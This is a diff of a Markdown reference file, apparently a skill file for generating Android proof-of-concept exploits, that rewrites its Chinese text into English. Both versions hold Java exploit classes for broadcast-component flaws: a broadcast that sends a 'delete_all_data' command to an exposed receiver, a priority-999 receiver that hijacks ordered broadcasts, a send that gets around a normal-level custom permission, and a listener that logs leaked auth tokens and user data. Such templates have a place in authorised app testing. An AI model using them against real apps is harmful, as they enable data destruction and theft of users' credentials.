@@ -1,119 +1,113 @@
 ---
 name: poc-app-broadcast
-description: Broadcast 组件攻击 PoC — 覆盖动态广播滥用、有序广播劫持、权限绕过、本地广播泄露 4 种漏洞类型
+description: Broadcast PoC reference covering dynamic receiver abuse, ordered-broadcast hijack, permission bypass, and global broadcast leakage.
 ---
 
-# Broadcast 组件攻击 PoC
+# Broadcast PoC Reference
 
-广播是 Android 消息传递机制，攻击者可通过发送恶意广播触发目标 Receiver 执行危险操作。
+Use this reference for attacker-controlled or attacker-observable broadcast flows. Broadcast PoCs usually fit `direct-trigger` or `interception` mode.
 
-## 漏洞类型索引
+## Construction Matrix
 
-| 漏洞 | 等级 | PoC 类名 |
-|------|------|---------|
-| 动态广播滥用 | MEDIUM | `BroadcastDynamicAbuseExploit` |
-| 有序广播劫持 | MEDIUM | `BroadcastOrderedHijackExploit` |
-| 权限绕过 | HIGH | `BroadcastPermissionBypassExploit` |
-| 本地广播泄露 | MEDIUM | `BroadcastLocalLeakExploit` |
+| Vulnerability | Exploit mode | Typical support | Visible success |
+|---------------|--------------|-----------------|-----------------|
+| dynamic receiver abuse | `direct-trigger` | none | receiver accepts attacker command |
+| ordered hijack | `interception` | runtime receiver | result is modified or broadcast is aborted |
+| permission bypass | `direct-trigger` | manifest permission declaration | protected broadcast still sends or lands |
+| global leak | `interception` | runtime receiver | sensitive extras are captured |
 
-## BroadcastDynamicAbuseExploit
+## Pattern 1 - Direct Broadcast Send
 
-向动态注册的 Receiver 发送恶意广播，触发敏感操作。
+Use for `BroadcastDynamicAbuseExploit` and many permission-bypass cases.
 
 ```java
-public class BroadcastDynamicAbuseExploit extends Exploit {
+public final class BroadcastDynamicAbuseExploit extends Exploit {
+    public BroadcastDynamicAbuseExploit(Context context) {
+        super(context);
+    }
+
     @Override
     public void execute() {
         Intent intent = new Intent("com.target.INTERNAL_ACTION");
         intent.putExtra("command", "delete_all_data");
         intent.putExtra("confirm", true);
         context.sendBroadcast(intent);
+        log("Sent attacker-controlled broadcast to com.target.INTERNAL_ACTION");
     }
 }
 ```
 
-## BroadcastOrderedHijackExploit
+Use when:
 
-注册高优先级 Receiver 拦截有序广播，篡改或丢弃结果。
+- the verified finding is about a receiver trusting attacker-supplied action strings or extras
+
+## Pattern 2 - Ordered-Broadcast Interception
+
+Use for `BroadcastOrderedHijackExploit`.
 
 ```java
-public class BroadcastOrderedHijackExploit extends Exploit {
+public final class BroadcastOrderedHijackExploit extends Exploit {
+    public BroadcastOrderedHijackExploit(Context context) {
+        super(context);
+    }
+
     @Override
     public void execute() {
-        // 1. 注册高优先级拦截 Receiver
         IntentFilter filter = new IntentFilter("com.target.ORDERED_ACTION");
-        filter.setPriority(999); // 最高优先级
+        filter.setPriority(999);
 
         BroadcastReceiver interceptor = new BroadcastReceiver() {
             @Override
             public void onReceive(Context ctx, Intent intent) {
                 log("Intercepted ordered broadcast");
-                // 篡改结果
                 setResultData("tampered_result");
-                // 或直接终止广播传播
-                // abortBroadcast();
             }
         };
+
         context.registerReceiver(interceptor, filter, Context.RECEIVER_EXPORTED);
 
-        // 2. 发送有序广播触发拦截
         Intent intent = new Intent("com.target.ORDERED_ACTION");
-        intent.putExtra("key", "original_value");
         context.sendOrderedBroadcast(intent, null);
-
-        // 3. 清理
-        context.unregisterReceiver(interceptor);
     }
 }
 ```
 
-## BroadcastPermissionBypassExploit
+Success signal:
 
-声明与目标相同的 normal 级别自定义权限，绕过广播保护。
+- modified result reaches the next receiver, or
+- the ordered flow is aborted
+
+## Pattern 3 - Broadcast Leak Listener
+
+Use for `BroadcastLocalLeakExploit`.
 
 ```java
-public class BroadcastPermissionBypassExploit extends Exploit {
-    @Override
-    public void execute() {
-        // 前提：目标使用 protectionLevel="normal" 的自定义权限保护广播
-        // PoC 的 AndroidManifest.xml 中需声明相同权限：
-        // <uses-permission android:name="com.target.PERMISSION_RECEIVE" />
-
-        Intent intent = new Intent("com.target.PROTECTED_ACTION");
-        intent.putExtra("sensitive_command", "export_data");
-        // 使用目标声明的权限发送广播
-        context.sendBroadcast(intent, "com.target.PERMISSION_RECEIVE");
+public final class BroadcastLocalLeakExploit extends Exploit {
+    public BroadcastLocalLeakExploit(Context context) {
+        super(context);
     }
-}
-```
 
-> 注意：需在 PoC 的 `AndroidManifest.xml` 中声明目标使用的自定义权限。`protectionLevel="normal"` 的权限任何 app 都可声明，`signature` 级别则不行。
-
-## BroadcastLocalLeakExploit
-
-注册 Receiver 监听目标应用发出的全局广播，截获敏感数据。
-
-```java
-public class BroadcastLocalLeakExploit extends Exploit {
     @Override
     public void execute() {
-        // 监听目标应用误用全局广播发送的敏感数据
         IntentFilter filter = new IntentFilter("com.target.SENSITIVE_DATA_ACTION");
-
         BroadcastReceiver listener = new BroadcastReceiver() {
             @Override
             public void onReceive(Context ctx, Intent intent) {
-                String token = intent.getStringExtra("auth_token");
-                String userData = intent.getStringExtra("user_data");
-                log("Leaked token: " + token);
-                log("Leaked user data: " + userData);
+                log("Leaked token: " + intent.getStringExtra("auth_token"));
+                log("Leaked user data: " + intent.getStringExtra("user_data"));
             }
         };
         context.registerReceiver(listener, filter, Context.RECEIVER_EXPORTED);
-
-        // 保持监听，等待目标应用发送广播
-        log("Listening for sensitive broadcasts... wait for target app action");
-        // 实际场景中需保持 Receiver 注册，在 onDestroy 中 unregister
+        log("Registered broadcast listener and waiting for target broadcast");
     }
 }
 ```
+
+Use when:
+
+- the target leaks sensitive extras through a global broadcast
+
+## Manifest Notes
+
+- declare the target custom permission only for permission-bypass cases where `protectionLevel` is weak enough to be attacker-obtainable
+- do not declare unnecessary receiver components if a runtime receiver already demonstrates the finding
